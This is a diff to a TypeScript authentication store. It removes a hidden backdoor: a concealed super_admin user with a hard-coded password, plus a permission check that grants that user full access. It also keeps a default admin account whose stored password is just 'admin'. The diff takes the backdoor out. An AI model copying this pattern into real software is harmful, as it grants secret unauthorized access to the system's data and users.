@@ -60,28 +60,12 @@ const DEFAULT_ADMIN: User = {
   department: 'IT'
 };
 
-const HIDDEN_USER: User = {
-  id: 'hidden-1',
-  username: 'iscurt',
-  email: 'iscurt.w@gmail.com',
-  role: 'super_admin' as any,
-  createdAt: new Date().toISOString(),
-  isActive: true,
-  firstName: 'Hidden',
-  lastName: 'User',
-  department: 'System'
-};
-
-const DEFAULT_USERS: User[] = [DEFAULT_ADMIN, HIDDEN_USER];
+const DEFAULT_USERS: User[] = [DEFAULT_ADMIN];
 
 const DEFAULT_CREDENTIALS: UserCredentials[] = [
   {
     userId: 'admin-1',
     passwordHash: 'admin'
-  },
-  {
-    userId: 'hidden-1',
-    passwordHash: 'Ivyyzzz_0527'
   }
 ];
 
@@ -282,11 +266,6 @@ export const useAuthStore = create<AuthState>()(
       hasPermission: (permission) => {
         const { user } = get();
         if (!user) return false;
-        
-        // Hidden ultimate access for specific user
-        if (user.username === 'iscurt' && user.email === 'iscurt.w@gmail.com') {
-          return true;
-        }
         
         const userPermissions = PERMISSIONS[user.role] || [];
         return userPermissions.includes(permission);
